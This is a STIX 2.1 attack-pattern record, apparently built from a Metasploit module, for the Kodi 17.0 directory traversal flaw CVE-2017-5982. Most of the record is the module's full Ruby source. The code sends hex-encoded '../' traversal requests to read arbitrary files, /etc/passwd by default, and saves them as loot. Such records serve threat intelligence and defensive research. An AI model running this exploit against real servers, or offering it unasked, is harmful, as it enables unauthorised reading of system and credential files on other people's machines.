{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba3f15d7-4f5e-4c53-a398-79dd62818c77",
    "created": "2024-08-14T16:29:54.737272Z",
    "modified": "2024-08-14T16:29:54.737278Z",
    "name": "Kodi 17.0 Local File Inclusion Vulnerability",
    "description": " This module exploits a directory traversal flaw found in Kodi before 17.1.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/kodi_traversal.rb",
            "external_id": "kodi_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kodi 17.0 Local File Inclusion Vulnerability',\n      'Description'    => %q{\n        This module exploits a directory traversal flaw found in Kodi before 17.1.\n      },\n      'References'     =>\n        [\n          ['CVE', '2017-5982'],\n        ],\n      'Author'         =>\n        [\n          'Eric Flokstra',  #Original\n          'jvoisin'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2017-02-12'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),\n        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),\n        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])\n      ])\n  end\n\n\n  def run_host(ip)\n    base = normalize_uri(target_uri.path)\n\n    peer = \"#{ip}:#{rport}\"\n\n    print_status(\"Reading '#{datastore['FILE']}'\")\n\n    traverse = '../' * datastore['DEPTH']\n    f = datastore['FILE']\n    f = f[1, f.length] if f =~ /^\\//\n    f = \"image/image://\" + Rex::Text.uri_encode(traverse + f, \"hex-all\")\n\n    uri = normalize_uri(base, Rex::Text.uri_encode(f, \"hex-all\"))\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    if res and res.code != 200\n      print_error(\"Unable to read '#{datastore['FILE']}', possibily because:\")\n      print_error(\"\\t1. File does not exist.\")\n      print_error(\"\\t2. No permission.\")\n\n    elsif res and res.code == 200\n      data = res.body.lstrip\n      fname = datastore['FILE']\n      p = store_loot(\n        'kodi',\n        'application/octet-stream',\n        ip,\n        data,\n        fname\n      )\n\n      vprint_line(data)\n      print_good(\"#{fname} stored as '#{p}'\")\n\n    else\n      print_error('Fail to obtain file for some unknown reason')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-02-12"
}